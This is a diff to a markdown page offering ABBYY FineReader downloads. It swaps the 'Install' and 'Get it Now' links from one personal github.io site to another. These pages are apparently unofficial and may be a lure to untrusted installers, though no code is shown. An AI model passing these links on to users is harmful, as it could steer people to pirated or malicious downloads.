@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/abbyYFineReader)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://stul-stol.github.io/.github/abbyYFineReader)
 
 </div>
 
@@ -81,7 +81,7 @@ ABBYY FineReader's OCR accuracy advantage over free and basic alternatives is mo
 
 <p align="center">
 
-[![Get it Now ABBYY FineReader](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/abbyYFineReader)
+[![Get it Now ABBYY FineReader](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://stul-stol.github.io/.github/abbyYFineReader)
 
 </p>
 
